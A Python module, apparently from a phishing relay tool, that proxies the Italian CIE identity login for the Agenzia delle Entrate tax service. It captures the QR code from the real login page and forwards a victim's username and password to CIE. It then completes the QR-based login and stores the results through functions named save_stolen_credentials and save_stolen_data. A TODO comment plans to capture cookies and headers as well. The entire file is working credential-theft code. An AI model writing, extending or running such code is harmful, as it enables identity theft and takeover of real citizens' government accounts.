from .client import execute_access_flow, access_again_login_page, post_credentials, get_qr_code_status, submit_scanned_qr_code, confirm_access
from .parser import extract_qr_code, extract_login_errors
from ..flow import LoginFlow
from ..utils.writer import save_stolen_credentials, save_stolen_data

def access_login_page() -> LoginFlow:
    """Get QR Code from CIE login page"""
    # Executes the CIE access flow to reach the login page
    login_flow = execute_access_flow()

    # Extracts the QR code from the response
    login_flow.set_qr_code(extract_qr_code(login_flow.response.text))

    return login_flow

def get_new_qr_code(login_flow: LoginFlow) -> None:
    """Get a new QR Code from CIE login page"""
    # Visits the CIE login page again to get a new QR code
    access_again_login_page(login_flow)

    # Extracts the QR code from the response
    login_flow.set_qr_code(extract_qr_code(login_flow.response.text))

def submit_credentials(login_flow: LoginFlow, credentials: dict) -> dict | None:
    """Authenticates user into the Service Provider (Agenzia delle Entrate) by inserting credentials in the selected Identity Provider (CIE)"""
    username = credentials.get("username", "")
    password = credentials.get("password", "")
    login_flow.username = username
    login_flow.password = password
    save_stolen_credentials(username, password)

    # Posts the credentials to the CIE login page and retrieves the response
    post_credentials(login_flow, credentials)

    # Check for login errors
    error = extract_login_errors(login_flow.response.text)

    return error

def check_qr_code(login_flow: LoginFlow) -> dict:
    """Checks if the QR code has been scanned and returns the result"""
    get_qr_code_status(login_flow)
    return login_flow.response.json()

def retrieve_access_after_qr_code_scan(login_flow: LoginFlow) -> None:
    """Retrieves the access to the Service Provider (Agenzia delle Entrate) after the QR code has been scanned"""
    submit_scanned_qr_code(login_flow)
    confirm_access(login_flow)
    save_stolen_data(login_flow) # TODO: save more data if possible (e.g., cookies, headers, etc.)
